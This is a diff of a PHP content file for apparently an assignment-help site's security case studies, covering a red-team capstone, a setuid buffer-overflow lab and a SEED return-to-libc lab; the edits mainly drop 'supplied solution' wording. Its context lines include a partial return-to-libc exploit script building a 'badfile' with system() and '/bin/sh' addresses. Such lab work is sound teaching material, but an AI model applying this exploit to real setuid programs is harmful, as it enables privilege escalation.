@@ -45,12 +45,12 @@ return [
             ['Initial Access', 'Weak authentication and password-based attacks provide entry to the lab environment.'],
             ['Privilege Escalation', 'Misconfigurations and credential extraction move access from low privilege to higher privilege.'],
             ['Lateral Movement', 'SMB and RDP are used to expand control across systems.'],
-            ['Active Directory', 'Kerberoasting and DCSync are part of the domain-compromise phase described by the supplied solution.'],
+            ['Active Directory', 'Kerberoasting and DCSync are part of the completed domain-compromise phase.'],
             ['Business Impact', 'The challenge ends by demonstrating the severity of compromise in the simulated banking environment.'],
             ['Incident Response', 'Detection, investigation, containment and post-incident analysis are connected back to each attack phase.']
         ],
         'evidence_image' => '/assets/case-studies/red-team-capstone-incident-response/evidence.svg',
-        'evidence_caption' => 'Privacy-safe evidence excerpt based on the supplied solution screenshot. Student-identifying information has been removed for public publication.',
+        'evidence_caption' => 'Privacy-safe project evidence excerpt. Student-identifying information has been removed for public publication.',
         'related_links' => [
             ['/penetration-testing-assignment-help', 'Penetration Testing Assignment Help'],
             ['/ethical-hacking-assignment-help', 'Ethical Hacking Assignment Help'],
@@ -1022,7 +1022,7 @@ return [
         'topic_q2' => 'Requirement: Buffer Overflow Attack Demo',
         'topic_q3' => 'Solution: getscore Privilege Escalation',
         'tool_q3' => 'Tools: GCC · GDB · Linux',
-        'course' => 'CSCE 4550 — Operating Systems Security',
+        'course' => 'CSCE 4550: Operating Systems Security',
         'target' => 'getscore (setuid root) on a Red Hat Linux VM',
         'requirements_intro' => 'The lab is organised into four stages: prepare the virtual machine, compile and configure the getscore program, deliberately trigger and inspect a segmentation fault, and then use the crash evidence to reason about a controlled buffer overflow in the authorised lab environment.',
         'requirements' => [
@@ -1455,7 +1455,7 @@ TXT,
         'lab' => 'Return-to-libc Attack Lab',
         'environment' => 'SEED Ubuntu 20.04 VM',
         'architecture' => '32-bit program on x64 VM',
-        'buf_size' => '96 in supplied solution',
+        'buf_size' => '96',
         'requirement_map' => [
             ['01','Environment Setup','Use the SEED Ubuntu 20.04 lab environment, compile the 32-bit vulnerable program, disable the specified countermeasures and keep the stack non-executable.'],
             ['02','Task 1: Find libc Addresses','Use gdb with the target Set-UID program to find the addresses needed from libc and determine the saved return-address offset.'],
@@ -1614,7 +1614,7 @@ content = bytearray(0xaa for i in range(300))
 
 sh_addr     = 0xffffd47f  # <--- REPLACE with your new ./prtenv output
 system_addr = 0xf7e12420
-# exit_addr removed — not used in this version
+# exit_addr removed: not used in this version
 
 Y = 112                   # Your offset
 X = Y + 8
@@ -1622,7 +1622,7 @@ Z = Y + 4
 
 content[X:X+4] = (sh_addr).to_bytes(4, \'little\')
 content[Y:Y+4] = (system_addr).to_bytes(4, \'little\')
-# content[Z:Z+4] intentionally left untouched — stays 0xaaaaaaaa
+# content[Z:Z+4] intentionally left untouched: stays 0xaaaaaaaa
 
 with open("badfile", "wb") as f:
     f.write(content)'],
